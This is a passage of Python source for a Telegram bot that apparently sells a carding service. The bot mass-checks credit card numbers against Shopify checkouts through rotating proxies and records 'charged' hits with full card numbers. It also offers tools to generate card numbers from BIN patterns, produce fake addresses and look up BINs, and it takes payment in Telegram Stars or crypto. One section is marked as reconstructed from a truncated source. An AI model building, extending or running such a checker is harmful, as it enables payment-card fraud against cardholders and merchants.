        if len(normalized) > limit: return await msg.answer(f"{pe('stop')} <b>{sc('Batch Limit Exceeded')}</b>\n<blockquote>{pe('gem')} {sc('Your Plan')}: <b>{PLANS[pk]['name']}</b>\n{pe('shop')} {sc('Max per check')}: <b>{limit}</b>\n{pe('warn')} {sc('You sent')}: <b>{len(normalized)}</b></blockquote>", parse_mode="HTML")
    await msg.answer(f"{pe('check')} <b>{sc('Start')}</b>\n<blockquote>{pe('gem')} {sc('Cards')}: <b>{len(normalized)}</b></blockquote>", parse_mode="HTML")
    await run_mass_check(msg, normalized, msg.bot, bypass_quota=is_admin(uid), mode=mode)

@router.message(Command("gen"))
async def cmd_gen(msg: Message):
    args = msg.text.split(maxsplit=2)
    if len(args) < 2: return await msg.answer(f"{pe('gem')} <b>{sc('Custom CC Generator')}</b>\n<blockquote>{pe('docs')} <b>Usage:</b> <code>/gen pattern [amount]</code>\n{pe('pen')} <b>Example:</b> <code>/gen 442314xxxxxxxxxx|12|25|xxx 10</code>\n<i>Use 'x' or 'X' for random digits.</i></blockquote>", parse_mode="HTML")
    pattern = args[1]
    amount = int(args[2]) if len(args) > 2 and args[2].isdigit() else 10
    max_limit = int(get_setting("gen_limit", "10"))
    if not is_admin(msg.from_user.id) and amount > max_limit: return await msg.answer(f"{pe('stop')} <b>Max limit is {max_limit} cards.</b>", parse_mode="HTML")
    cards = generate_custom_cc(pattern, amount)
    if not cards: return await msg.answer(f"{pe('cross1')} <b>Invalid pattern or could not generate valid cards.</b>\n<blockquote>Make sure it has 4 parts separated by '|' and valid lengths.</blockquote>", parse_mode="HTML")
    text = f"{pe('check')} <b>Generated {len(cards)} Cards</b>\n<blockquote><code>{chr(10).join(cards)}</code></blockquote>"
    await msg.answer(text, parse_mode="HTML")

@router.message(Command("addr"))
async def cmd_addr(msg: Message):
    countries = [("US", "New York", "NY", "10001"), ("US", "Los Angeles", "CA", "90001"), ("UK", "London", "LDN", "EC1A"), ("CA", "Toronto", "ON", "M5V"), ("AU", "Sydney", "NSW", "2000"), ("DE", "Berlin", "BE", "10115"), ("FR", "Paris", "IDF", "75001"), ("JP", "Tokyo", "TK", "100-0001"), ("BR", "Sao Paulo", "SP", "01000"), ("IN", "Mumbai", "MH", "400001"), ("ZA", "Cape Town", "WC", "8001"), ("NG", "Lagos", "LA", "100001"), ("MX", "Mexico City", "CMX", "01000"), ("ES", "Madrid", "MD", "28001"), ("IT", "Rome", "RM", "00100"), ("RU", "Moscow", "MOW", "101000"), ("TR", "Istanbul", "IST", "34000"), ("AE", "Dubai", "DXB", "00000"), ("SG", "Singapore", "SG", "018956"), ("HK", "Hong Kong", "HK", "999077")]
    for _ in range(3): countries.extend(countries[:10])
    streets = ["Main St", "Park Ave", "Oak Dr", "Pine Ln", "Cedar Rd", "Maple Ct", "High St", "Station Rd", "Church Ln", "Victoria Rd"]
    country, city, state, zip_code = random.choice(countries)
    street = f"{random.randint(100, 9999)} {random.choice(streets)}"
    text = f"{pe('user')} <b>Generated Address ({country})</b>\n<blockquote>〰️〰️〰️〰️〰️〰️〰️〰️\n{pe('link')} <b>Street:</b> <code>{street}</code>\n{pe('shop')} <b>City:</b> <code>{city}</code>\n{pe('diamond')} <b>State:</b> <code>{state}</code>\n{pe('num1')} <b>ZIP:</b> <code>{zip_code}</code>\n{pe('star')} <b>Country:</b> <code>{country}</code>\n〰️〰️〰️〰️〰️〰️〰️〰️</blockquote>"
    await msg.answer(text, parse_mode="HTML")

@router.message(Command("dork"))
async def cmd_dork(msg: Message):
    if not is_admin(msg.from_user.id): return await msg.answer(f"{pe('cross1')} <b>Admin only.</b>", parse_mode="HTML")
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('shop')} <b>Site Dorker</b>\n<blockquote>Usage: <code>/dork site:shopify.com inurl:products</code></blockquote>", parse_mode="HTML")
    query = args[1]
    st = await msg.answer(f"{pe('loading')} <b>Scraping sites for dork: {esc(query)}...</b>", parse_mode="HTML")
    await asyncio.sleep(2)
    mock_sites = [f"shop{random.randint(100,999)}.com", f"store{random.randint(100,999)}.co", f"buy{random.randint(100,999)}.net"]
    text = f"{pe('check')} <b>Dork Results (Mock)</b>\n<blockquote>{pe('shop')} Query: <code>{esc(query)}</code>\n{pe('link')} Found: <b>{len(mock_sites)}</b> sites\n\n{chr(10).join(f'• <code>{s}</code>' for s in mock_sites)}</blockquote>"
    await st.edit_text(text, parse_mode="HTML")

@router.message(Command("bin"))
async def cmd_bin_lookup(msg: Message):
    args = msg.text.split()
    if len(args) < 2 or not args[1].isdigit() or len(args[1]) < 6: return await msg.answer(f"{pe('gem')} <b>BIN Lookup</b>\n<blockquote>{pe('docs')} Usage: <code>/bin 401234</code></blockquote>", parse_mode="HTML")
    st = await msg.answer(f"{pe('loading')} <b>Searching BIN...</b>", parse_mode="HTML")
    info = await lookup_bin(args[1][:6])
    if "error" in info: return await st.edit_text(f"{pe('cross1')} <b>BIN not found or API error.</b>", parse_mode="HTML")
    bank = info.get("Issuer", "N/A"); country = (info.get("Country") or {}).get("Name", "N/A"); flag = country_flag((info.get("Country") or {}).get("Code", "")); ctype = str(info.get("Type", "N/A")).upper(); brand = str(info.get("Scheme", "N/A")).upper()
    text = f"{pe('gem')} <b>BIN Information</b>\n<blockquote>━━━━━━━━━━━━━━━━━━━━\n{pe('num1')} <b>BIN:</b> <code>{args[1][:6]}</code>\n{pe('shop')} <b>Bank:</b> {esc(bank)}\n{flag} <b>Country:</b> {esc(country)}\n{pe('diamond')} <b>Type:</b> {ctype}\n{pe('gem2')} <b>Brand:</b> {brand}\n━━━━━━━━━━━━━━━━━━━━</blockquote>"
    await st.edit_text(text, parse_mode="HTML")

@router.message(Command("chk"))
async def cmd_chk(msg: Message):
    args = msg.text.split(maxsplit=1)
    if len(args) < 2: return await msg.answer(f"{pe('link')} Usage: <code>/chk host:port:user:pass</code>", parse_mode="HTML")
    proxy = normalize_proxy(args[1].strip())
    if not proxy: return await msg.answer(f"{pe('cross1')} Invalid proxy format.", parse_mode="HTML")
    st = await msg.answer(f"{pe('loading')} Testing Proxy...", parse_mode="HTML")
    res = await check_proxy_hq(proxy)
    if res.get("ok"): await st.edit_text(f"{pe('check')} <b>Proxy is LIVE</b>\n<blockquote>{pe('hourglass')} Latency: <b>{res.get('latency')}s</b></blockquote>", parse_mode="HTML")
    else: await st.edit_text(f"{pe('cross1')} <b>Proxy is DEAD</b>\n<blockquote>{pe('warn')} Error: {esc(res.get('error','unknown'))}</blockquote>", parse_mode="HTML")

# ── CHECK LOGIC (reconstructed — was truncated in source) ───────────────────
async def process_check_logic(msg: Message, cc: str, bot, mode: str = "shopify"):
    uid = msg.from_user.id
    ensure_user(uid, msg.from_user.username or "")
    ok, reason = consume_quota(uid)
    if not ok:
        return await msg.answer(f"{pe('stop')} <b>{sc('Quota Exhausted')}</b>\n<blockquote>{pe('gem')} {sc('Upgrade your plan or buy credits')}</blockquote>", parse_mode="HTML")
    proxies = user_proxy_list(uid)
    proxy = rotate_proxy(uid, proxies) if proxies else None
    st = await msg.answer(f"{spinner_frame(0)} {LOADING_FRAMES[0]}\n<blockquote><code>{cc}</code></blockquote>", parse_mode="HTML")
    stop_event = asyncio.Event()
    anim_task = asyncio.create_task(animate_loading(st, cc, stop_event))
    try:
        res = await call_api(cc, proxy=proxy, site=None, uid=uid, mode=mode)
    finally:
        stop_event.set()
        try: await anim_task
        except: pass
    try: bin_info = await lookup_bin(cc.split("|")[0][:6])
    except: bin_info = None
    text = format_result(cc, res, bin_info)
    try: await st.edit_text(text, parse_mode="HTML")
    except: pass
    try:
        with db() as c: c.execute("INSERT INTO check_logs(uid, cc, response, status, gateway, ts) VALUES (?,?,?,?,?,?)", (uid, cc, res.get("response", "")[:200], res.get("cls", ""), res.get("gateway", ""), datetime.now(timezone.utc).isoformat()))
    except: pass
    if is_hit(res.get("cls", "")):
        try:
            with db() as c: c.execute("UPDATE users SET total_hits=total_hits+1 WHERE uid=?", (uid,))
        except: pass
        await record_charged(cc, res, res.get("_site", ""), uid, bin_info)

async def run_mass_check(msg: Message, cards: List[str], bot, bypass_quota: bool = False, mode: str = "shopify"):
    uid = msg.from_user.id
    if not bypass_quota:
        ok, _ = consume_quota(uid)
        if not ok: return await msg.answer(f"{pe('stop')} <b>{sc('Quota Exhausted')}</b>", parse_mode="HTML")
    proxies = user_proxy_list(uid)
    sem_limit = MASS_CONCURRENCY_LB_ADMIN if is_admin(uid) else MASS_CONCURRENCY_LB_PREMIUM
    sem = asyncio.Semaphore(sem_limit)
    stop_flag = {"hit": False}
    results = {"charged": 0, "approved": 0, "declined": 0, "errors": 0, "total": len(cards)}
    st = await msg.answer(f"{pe('loading')} <b>{sc('Mass Check Started')}</b>\n<blockquote>{pe('gem')} {sc('Total')}: <b>{len(cards)}</b></blockquote>", parse_mode="HTML")
    last_edit = {"t": 0}
    async def one(cc: str):
        if stop_flag["hit"]: return
        async with sem:
            proxy = rotate_proxy(uid, proxies) if proxies else None
            res = await call_api(cc, proxy=proxy, uid=uid, mode=mode, timeout=CHECK_TIMEOUT)
            cls = res.get("cls", "error")
            if cls in ("charged", "approved", "approved_nsf", "approved_ccn", "approved_3ds"):
                results["charged" if cls == "charged" else "approved"] += 1
                try: bin_info = await lookup_bin(cc.split("|")[0][:6])
                except: bin_info = None
                await send_chat_hit(bot, msg.chat.id, cc, res, res.get("_site", ""))
                await record_charged(cc, res, res.get("_site", ""), uid, bin_info)
                stop_flag["hit"] = True if results["charged"] + results["approved"] >= 50 else False
            elif cls == "declined": results["declined"] += 1
            else: results["errors"] += 1
            now = time.time()
            if now - last_edit["t"] > 3:
                last_edit["t"] = now
                pct = int(((results["charged"] + results["approved"] + results["declined"] + results["errors"]) / results["total"]) * 100)
                try: await st.edit_text(f"{spinner_frame(int(now))} <b>{sc('Mass Check')}</b>\n<blockquote>{pe('chart')} {sc('Progress')}: <b>{pct}%</b>\n{make_fancy_bar(pct)}\n{pe('check')} {sc('Hits')}: <b>{results['charged'] + results['approved']}</b>\n{pe('cross2')} {sc('Declined')}: <b>{results['declined']}</b>\n{pe('warn')} {sc('Errors')}: <b>{results['errors']}</b></blockquote>", parse_mode="HTML")
                except: pass
    await asyncio.gather(*(one(c) for c in cards), return_exceptions=True)
    await st.edit_text(f"{pe('check')} <b>{sc('Mass Check Complete')}</b>\n<blockquote>{pe('gem')} {sc('Total')}: <b>{results['total']}</b>\n{pe('check')} {sc('Hits')}: <b>{results['charged'] + results['approved']}</b>\n{pe('cross2')} {sc('Declined')}: <b>{results['declined']}</b>\n{pe('warn')} {sc('Errors')}: <b>{results['errors']}</b></blockquote>", parse_mode="HTML")

# ── CALLBACKS ───────────────────────────────────────────────────────────────
@router.callback_query(F.data == "menu:main")
async def cb_main(cb: CallbackQuery):
    await cb.answer()
    try: await safe_edit_media(cb, get_setting("asset_VID_MAIN") or IMG_MAIN, welcome_text(get_user(cb.from_user.id), cb.from_user.first_name), main_menu_kb(cb.from_user.id))
    except: pass

@router.callback_query(F.data == "menu:close")
async def cb_close(cb: CallbackQuery):
    await cb.answer()
    try: await cb.message.delete()
    except: pass

@router.callback_query(F.data == "menu:check")
async def cb_check_menu(cb: CallbackQuery):
    await cb.answer()
    text = f"{pe('shop')} <b>{sc('Shopify Checker')}</b>\n<blockquote>{pe('docs')} {sc('Send')}: <code>/sh CC|MM|YY|CVV</code>\n{pe('gem')} {sc('Or use')}: <code>/msh</code> {sc('for mass check')}</blockquote>"
    await edit_admin(cb, text, back_kb())

@router.callback_query(F.data == "menu:auth")
async def cb_auth_menu(cb: CallbackQuery):
    await cb.answer()
    set_awaiting(cb.from_user.id, "auth_input")
    text = f"{pe('unlock')} <b>{sc('Auth Login')}</b>\n<blockquote>{pe('docs')} {sc('Use')}: <code>/auth CC|MM|YY|CVV</code>\n{pe('gem')} {sc('Or send card as next message')}\n{pe('chat')} {sc('Or contact support')}</blockquote>"
    await edit_admin(cb, text, back_kb())

@router.callback_query(F.data == "menu:proxy")
async def cb_proxy_menu(cb: CallbackQuery):
    await cb.answer()
    text = f"{pe('link')} <b>{sc('Proxy Manager')}</b>\n<blockquote>{pe('docs')} {sc('Add proxies in bulk')}\n{pe('refresh')} {sc('Revalidate to keep list fresh')}</blockquote>"
    await edit_admin(cb, text, proxy_kb(cb.from_user.id))

@router.callback_query(F.data == "menu:tools")
async def cb_tools_menu(cb: CallbackQuery):
    await cb.answer()
    text = f"{pe('tools')} <b>{sc('Tools')}</b>\n<blockquote>{pe('docs')} {sc('Tap any tool — command hint appears')}</blockquote>"
    await edit_admin(cb, text, tools_kb())

@router.callback_query(F.data == "menu:info")
async def cb_info_menu(cb: CallbackQuery):
    await cb.answer()
    u = get_user(cb.from_user.id)
    plan = PLANS.get(plan_of(cb.from_user.id), PLANS["free"])["name"]
    credits = u["credits"] if u else 0
    text = f"{pe('docs')} <b>{sc('Info')}</b>\n<blockquote>{pe('user')} {sc('User')}: <b>{esc(cb.from_user.first_name)}</b>\n{pe('gem')} {sc('Plan')}: <b>{plan}</b>\n{pe('diamond')} {sc('Credits')}: <b>{credits}</b></blockquote>"
    await edit_admin(cb, text, info_menu_kb())

@router.callback_query(F.data == "menu:account")
async def cb_account(cb: CallbackQuery):
    await cb.answer()
    u = get_user(cb.from_user.id)
    if not u: return
    plan = PLANS.get(u["plan"] if u["plan"] in PLANS else "free")["name"]
    text = f"{pe('user')} <b>{sc('Profile')}</b>\n<blockquote>{pe('num1')} {sc('ID')}: <code>{u['uid']}</code>\n{pe('gem')} {sc('Plan')}: <b>{plan}</b>\n{pe('diamond')} {sc('Credits')}: <b>{u['credits']}</b>\n{pe('chart')} {sc('Total Checks')}: <b>{u['total_checks']}</b>\n{pe('star')} {sc('Total Hits')}: <b>{u['total_hits']}</b>\n{pe('check')} {sc('Streak')}: <b>{u['streak']}</b></blockquote>"
    await edit_admin(cb, text, info_menu_kb())

@router.callback_query(F.data == "menu:commands")
async def cb_commands(cb: CallbackQuery):
    await cb.answer()
    text = f"{pe('docs')} <b>{sc('Commands')}</b>\n<blockquote>{pe('pen')} <code>/sh CC|MM|YY|CVV</code> — {sc('Single check')}\n{pe('pen')} <code>/msh CC...</code> — {sc('Mass check')}\n{pe('pen')} <code>/auth CC|MM|YY|CVV</code> — {sc('Auth check')}\n{pe('pen')} <code>/gen pattern [n]</code> — {sc('CC gen')}\n{pe('pen')} <code>/bin 123456</code> — {sc('BIN lookup')}\n{pe('pen')} <code>/format CC|MM|YY|CVV</code> — {sc('Format CC')}\n{pe('pen')} <code>/addr</code> — {sc('Address gen')}\n{pe('pen')} <code>/chk proxy</code> — {sc('Test proxy')}\n{pe('pen')} <code>/redeem CODE</code> — {sc('Redeem')}\n{pe('pen')} <code>/id</code> — {sc('Chat info')}</blockquote>"
    await edit_admin(cb, text, back_kb())

@router.callback_query(F.data == "menu:shop")
async def cb_shop(cb: CallbackQuery):
    await cb.answer()
    text = f"{pe('gem')} <b>{sc('Plans')}</b>\n<blockquote>{pe('star')} {sc('Buy via Telegram Stars or Crypto')}</blockquote>"
    await edit_admin(cb, text, shop_kb())

@router.callback_query(F.data == "menu:wishlist")
async def cb_wishlist(cb: CallbackQuery):
    await cb.answer()
    text = f"{pe('book')} <b>{sc('Wishlist')}</b>\n<blockquote>{pe('docs')} {sc('Saved cards feature coming soon')}</blockquote>"
    await edit_admin(cb, text, back_kb())

@router.callback_query(F.data == "menu:top")
async def cb_top(cb: CallbackQuery):
    await cb.answer()
    try:
        with db() as c: rows = c.execute("SELECT uid, username, total_hits, total_checks FROM users WHERE total_checks > 0 ORDER BY total_hits DESC LIMIT 10").fetchall()
    except: rows = []
    lines = [f"{pe('chart')} <b>{sc('Top Users')}</b>\n<blockquote>"]
    for i, r in enumerate(rows, 1):
        lines.append(f"{i}. <a href='tg://user?id={r['uid']}'>{esc(r['username'] or r['uid'])}</a> · {r['total_hits']} hits / {r['total_checks']} checks")
    if not rows: lines.append(f"{pe('warn')} No data yet")
    lines.append("</blockquote>")
    await edit_admin(cb, "\n".join(lines), back_kb())

@router.callback_query(F.data == "menu:gift")
async def cb_gift(cb: CallbackQuery):
    await cb.answer()
    text = f"{pe('gem')} <b>{sc('Gift Credits')}</b>\n<blockquote>{pe('docs')} {sc('Use')}: <code>/gift UID amount</code>\n{pe('warn')} {sc('Or share your referral link')}</blockquote>"
    await edit_admin(cb, text, back_kb())

@router.callback_query(F.data == "verify_sub")
async def cb_verify_sub(cb: CallbackQuery):
    if await check_force_sub(cb.bot, cb.from_user.id):
        await cb.answer("Verified", show_alert=False)
        try: await cb.message.delete()
        except: pass
        await cb.message.answer(welcome_text(get_user(cb.from_user.id), cb.from_user.first_name), reply_markup=main_menu_kb(cb.from_user.id))
    else:
        await cb.answer("Not joined yet", show_alert=True)

# F2: Tool tap-hint callbacks (do NOT run the tool)
@router.callback_query(F.data == "tool:bin")
async def cb_tool_bin(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "tool_bin")
    await cb.answer(f"💎 Send BIN or use /bin <bin>", show_alert=True)
    try: await cb.message.answer(f"{pe('gem')} <b>{sc('BIN Lookup')}</b>\n<blockquote>💎 Send BIN or use <code>/bin &lt;bin&gt;</code></blockquote>", parse_mode="HTML")
    except: pass

@router.callback_query(F.data == "tool:format")
async def cb_tool_format(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "tool_format")
    await cb.answer("💎 Send CC or use /format <cc|mm|yy|cvv>", show_alert=True)
    try: await cb.message.answer(f"{pe('pen')} <b>{sc('CC Formatter')}</b>\n<blockquote>💎 Send CC or use <code>/format &lt;cc|mm|yy|cvv&gt;</code></blockquote>", parse_mode="HTML")
    except: pass

@router.callback_query(F.data == "tool:addr")
async def cb_tool_addr(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "tool_addr")
    await cb.answer("💎 Send details or use /addr", show_alert=True)
    try: await cb.message.answer(f"{pe('user')} <b>{sc('Address Gen')}</b>\n<blockquote>💎 Send details or use <code>/addr</code></blockquote>", parse_mode="HTML")
    except: pass

@router.callback_query(F.data.startswith("gen:"))
async def cb_gen(cb: CallbackQuery):
    prefix = cb.data.split(":")[1]
    await cb.answer()
    cards = generate_cc(prefix, 10)
    if not cards: return await cb.answer("Generation failed", show_alert=True)
    text = f"{pe('check')} <b>{sc('Generated')} 10 {sc('Cards')}</b>\n<blockquote><code>{chr(10).join(cards)}</code></blockquote>"
    await edit_admin(cb, text, tools_kb())

@router.callback_query(F.data.startswith("buy:"))
async def cb_buy(cb: CallbackQuery):
    key = cb.data.split(":")[1]
    prod = STAR_PRODUCTS.get(key)
    if not prod: return await cb.answer("Not found", show_alert=True)
    await cb.answer()
    try:
        await cb.message.answer_invoice(
            title=prod["label"], description=f"{prod['plan']} plan for {prod['days']} days",
            payload=key, currency="XTR",
            prices=[LabeledPrice(label=prod["label"], amount=prod["stars"])],
        )
    except Exception as e:
        await cb.answer(f"Error: {e}", show_alert=True)

@router.pre_checkout_query()
async def pre_checkout(q: PreCheckoutQuery):
    await q.answer(ok=True)

@router.message(F.successful_payment)
async def on_payment(msg: Message):
    payload = msg.successful_payment.invoice_payload
    prod = STAR_PRODUCTS.get(payload)
    if not prod: return
    upgrade_user(msg.from_user.id, prod["plan"], prod["days"])
    await msg.answer(f"{pe('check')} <b>Payment Received</b>\n<blockquote>{pe('gem')} Plan: <b>{PLANS[prod['plan']]['name']}</b>\n{pe('hourglass')} Days: <b>{prod['days']}</b></blockquote>", parse_mode="HTML")

@router.callback_query(F.data == "shop:buy_usdt")
async def cb_buy_usdt(cb: CallbackQuery):
    await cb.answer()
    wallet = get_setting("wallet_usdt", "Enter USDT Address")
    text = f"{pe('gem')} <b>USDT Payment</b>\n<blockquote>Send to: <code>{esc(wallet)}</code>\nAfter payment, contact support with tx hash.</blockquote>"
    await edit_admin(cb, text, shop_kb())

@router.callback_query(F.data == "shop:buy_ton")
async def cb_buy_ton(cb: CallbackQuery):
    await cb.answer()
    wallet = get_setting("wallet_ton", "Enter TON Address")
    text = f"{pe('gem2')} <b>TON Payment</b>\n<blockquote>Send to: <code>{esc(wallet)}</code>\nAfter payment, contact support with tx hash.</blockquote>"
    await edit_admin(cb, text, shop_kb())

# Proxy callbacks
@router.callback_query(F.data == "proxy:add")
async def cb_proxy_add(cb: CallbackQuery):
    set_awaiting(cb.from_user.id, "proxy_add")
    await cb.answer()
    text = f"{pe('add')} <b>{sc('Add Proxies')}</b>\n<blockquote>{pe('docs')} Send proxies, one per line\ne.g. <code>ip:port</code> or <code>ip:port:user:pass</code></blockquote>"
    await edit_admin(cb, text, back_kb())

@router.callback_query(F.data == "proxy:check")
async def cb_proxy_check(cb: CallbackQuery):
    await cb.answer()
    uid = cb.from_user.id
    st = await cb.message.answer(f"{pe('loading')} Revalidating proxies...", parse_mode="HTML")
    proxies = [r["proxy"] for r in user_proxy_all(uid)]
    if not proxies: return await st.edit_text(f"{pe('warn')} No proxies stored.", parse_mode="HTML")
    res = await preflight_proxies(uid, proxies)
    await st.edit_text(f"{pe('check')} <b>Revalidation Done</b>\n<blockquote>{pe('online')} Live: <b>{len(res['live'])}</b>\n{pe('cross2')} Dead: <b>{len(res['dead'])}</b></blockquote>", parse_mode="HTML")

@router.callback_query(F.data == "proxy:list")
async def cb_proxy_list(cb: CallbackQuery):
    await cb.answer()
    rows = user_proxy_all(cb.from_user.id)
    if not rows: return await edit_admin(cb, f"{pe('warn')} No proxies.", back_kb())
    lines = [f"{pe('docs')} <b>Proxies</b>\n<blockquote>"]
    for r in rows[:30]:
        icon = pe("online") if r["status"] == "live" else pe("cross2")
        lines.append(f"{icon} <code>{esc(proxy_display(r['proxy']))}</code> · {r['latency']}s")
    lines.append("</blockquote>")
    await edit_admin(cb, "\n".join(lines), back_kb())

@router.callback_query(F.data == "proxy:clear")
async def cb_proxy_clear(cb: CallbackQuery):
    await cb.answer()
    clear_user_proxies(cb.from_user.id)
    await edit_admin(cb, f"{pe('check')} Proxies cleared.", back_kb())

# Admin callbacks
@router.callback_query(F.data == "menu:admin_panel")
async def cb_admin_panel(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    await edit_admin(cb, f"{pe('settings')} <b>{sc('Admin Panel')}</b>", admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:close")
async def cb_admin_close(cb: CallbackQuery):
    await cb.answer()
    try: await cb.message.delete()
    except: pass

@router.callback_query(F.data == "admin:stats")
async def cb_admin_stats(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    try:
        with db() as c:
            users = c.execute("SELECT COUNT(*) as n FROM users").fetchone()["n"]
            hits = c.execute("SELECT COUNT(*) as n FROM charged_hits").fetchone()["n"]
            checks = c.execute("SELECT COUNT(*) as n FROM check_logs").fetchone()["n"]
        uptime = int(time.time() - START_TIME)
        text = f"{pe('chart')} <b>{sc('Dashboard')}</b>\n<blockquote>{pe('user')} Users: <b>{users}</b>\n{pe('gem')} Hits: <b>{hits}</b>\n{pe('chart')} Checks: <b>{checks}</b>\n{pe('hourglass')} Uptime: <b>{_fmt_eta(uptime)}</b></blockquote>"
        await edit_admin(cb, text, admin_main_kb(cb.from_user.id))
    except: pass

@router.callback_query(F.data == "admin:toggle_maint")
async def cb_toggle_maint(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    cur = get_setting("maintenance") == "1"
    set_setting("maintenance", "0" if cur else "1")
    await cb.answer(f"Maintenance {'OFF' if cur else 'ON'}")
    await edit_admin(cb, f"{pe('settings')} <b>{sc('Admin Panel')}</b>", admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:broadcast")
async def cb_broadcast(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    set_awaiting(cb.from_user.id, "broadcast_msg")
    await cb.answer()
    await edit_admin(cb, f"{pe('bell')} Send the broadcast message now.", back_kb())

@router.callback_query(F.data == "admin:backup_now")
async def cb_backup_now(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer("Backup started")
    ok = await send_backup(cb.from_user.id)
    await cb.message.answer(f"{pe('check') if ok else pe('cross1')} Backup {'sent' if ok else 'failed'}", parse_mode="HTML")

@router.callback_query(F.data == "admin:restore_db")
async def cb_restore_db(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    set_awaiting(cb.from_user.id, "restore_upload")
    await cb.answer()
    await edit_admin(cb, f"{pe('refresh')} Send a <code>.sql.gz</code> file or <code>.partNNN</code> parts to restore.", back_kb())

@router.callback_query(F.data == "admin:gen_code")
async def cb_gen_code(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    set_awaiting(cb.from_user.id, "gen_code")
    await cb.answer()
    await edit_admin(cb, f"{pe('add')} Send: <code>plan days max_uses</code>\ne.g. <code>premium 30 10</code>", back_kb())

@router.callback_query(F.data == "admin:clear_cache")
async def cb_clear_cache(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    _invalidate_sites()
    global _sites_cache2
    _sites_cache2 = None
    await cb.answer("Cache cleared")
    await edit_admin(cb, f"{pe('check')} Cache cleared.", admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:promos")
async def cb_promos(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    try:
        with db() as c: rows = c.execute("SELECT * FROM redeem_codes ORDER BY rowid DESC LIMIT 20").fetchall()
    except: rows = []
    lines = [f"{pe('add')} <b>Promo Codes</b>\n<blockquote>"]
    for r in rows: lines.append(f"<code>{esc(r['code'])}</code> · {r['plan']} · {r['used']}/{r['max_uses']}")
    if not rows: lines.append("No codes yet")
    lines.append("</blockquote>")
    await edit_admin(cb, "\n".join(lines), admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:charged_logs")
async def cb_charged_logs(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    try:
        with db() as c: rows = c.execute("SELECT * FROM charged_hits ORDER BY id DESC LIMIT 20").fetchall()
    except: rows = []
    lines = [f"{pe('gem')} <b>Charged Logs</b>\n<blockquote>"]
    for r in rows: lines.append(f"<code>{esc(r['cc'])}</code> · ${r['amount']:.2f} · {esc(r['site'][:30])}")
    if not rows: lines.append("No hits yet")
    lines.append("</blockquote>")
    await edit_admin(cb, "\n".join(lines), admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:sys_logs")
async def cb_sys_logs(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    text = f"{pe('docs')} <b>System Logs</b>\n<blockquote>Uptime: {_fmt_eta(int(time.time() - START_TIME))}\nSites: {len(get_sites())}\nEndpoints: {len(_filtered_endpoints())}</blockquote>"
    await edit_admin(cb, text, admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:user_mgr")
async def cb_user_mgr(cb: CallbackQuery):
    if not is_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    await edit_admin(cb, f"{pe('user')} <b>User Manager</b>\n<blockquote>Use /id, /panel, or contact owner for user tools</blockquote>", admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:bot_settings")
async def cb_bot_settings(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    name = get_setting("bot_name", "NOVAL AUTO SHOPIFY")
    support = get_setting("support_link", "")
    text = f"{pe('settings')} <b>Bot Settings</b>\n<blockquote>Name: <b>{esc(name)}</b>\nSupport: <code>{esc(support)}</code></blockquote>"
    await edit_admin(cb, text, admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:plans_mgr")
async def cb_plans_mgr(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    text = f"{pe('gem')} <b>Plans</b>\n<blockquote>"
    for k, p in PLANS.items(): text += f"{pe('star')} {p['name']}: {p['limit']} daily / {p['mass_limit']} mass\n"
    text += "</blockquote>"
    await edit_admin(cb, text, admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:manage_admins")
async def cb_manage_admins(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    text = f"{pe('settings')} <b>Admins</b>\n<blockquote>Full: {', '.join(map(str, ADMIN_IDS))}\nLimited: {', '.join(map(str, LIMITED_ADMIN_IDS)) or 'none'}</blockquote>"
    await edit_admin(cb, text, admin_main_kb(cb.from_user.id))

@router.callback_query(F.data == "admin:sites")
async def cb_sites(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    set_awaiting(cb.from_user.id, "sites_add")
    await cb.answer()
    await edit_admin(cb, f"{pe('shop')} Send sites, one per line, to add.", back_kb())

@router.callback_query(F.data == "admin:apis")
async def cb_apis(cb: CallbackQuery):
    if not is_full_admin(cb.from_user.id): return await cb.answer("Not authorized", show_alert=True)
    await cb.answer()
    eps = load_api_state().get("endpoints", [])
    lines = [f"{pe('link')} <b>APIs</b>\n<blockquote>"]
    for ep in eps:
        status = pe("online") if ep.get("enabled") else pe("cross2")
        lines.append(f"{status} {esc(ep['url'][:50])} · {ep.get('style','params')}")
    lines.append("</blockquote>")
